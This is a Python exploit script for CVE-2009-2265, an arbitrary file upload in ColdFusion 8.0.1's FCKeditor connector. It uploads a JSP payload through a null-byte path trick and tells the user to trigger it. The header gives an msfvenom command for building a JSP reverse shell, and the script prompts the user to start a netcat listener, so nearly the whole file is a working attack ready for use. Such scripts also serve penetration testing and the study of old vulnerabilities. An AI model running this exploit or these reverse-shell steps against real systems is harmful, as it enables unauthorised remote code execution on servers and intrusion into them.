#!/usr/bin/python3

# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2020
# Author: Manfred Heinz
# Original Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265
#
# Description:
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
# Generate a payload file by using: msfvenom -p java/jsp_shell_reverse_tcp -f raw LHOST=<yourip> LPORT=<yourport> -o shell.jsp

import sys
import requests
import argparse
import random
import string

def main():
    # process arguments
    args = process_args(argparse.ArgumentParser())
    show_settings(args)
    request, targetfilename = init(args)
    check_response(request, args.basepath, targetfilename)
    input('[info] Make sure you have a listener active \n[info] (e.g. nc -lvp 4444) before triggering the payload\n<press any key>\n')


# check response
def check_response(request, basepath, targetfilename):
    if request.status_code == 200:
        print('[+] File successfully uploaded!')
        print(F'[+] Goto \'{basepath}/userfiles/file/{targetfilename}\' to trigger the payload!')
    else:
        print('[-] File upload failed!')
        print('[-] Status Code: {request.status_code} - {request.status_reason}')
        

# process arguments    
def process_args(parser):
    # remote host, port, coldfusion basepath and file to upload
    parser.add_argument('-t', dest='target', required=True, help='target ip')
    parser.add_argument('-p', dest='port', type=int, help='target port', default=8500)
    parser.add_argument('-f', dest='filepath', help='path of file with shellcode to upload', default='shell.jsp')
    parser.add_argument('-b', dest='basepath', help='coldfusion basepath', default='')
    return parser.parse_args()


def show_settings(args):
    print('[info] Using following settings:')
    print('-'*35)
    for k,v in args.__dict__.items():
        print(F'{str(k).ljust(10)}: {str(v).rjust(20)}')
    print('-'*35)

def init(args):
    host = args.target
    port = args.port
    filepath = args.filepath
    basepath = args.basepath
    try:
        with open(filepath,'r') as payload:
            body = payload.read()
    except:
        print(F'[-] Could not read file \'{filepath}\' with payload!')
        sys.exit(1)

    targetfilename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))+'.jsp'
    uri = F'http://{host}:{port}/{basepath}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{targetfilename}%00'
    files= {'newfile': ('exploit.txt', body, 'application/x-java-archive')}      
    try:
        req = requests.post(uri, files=files, timeout=60)
    except requests.Timeout:
        print('[!!!] Request timed out!')
        sys.exit(1)
        
    return req, targetfilename

if __name__ == '__main__':
    main()
    

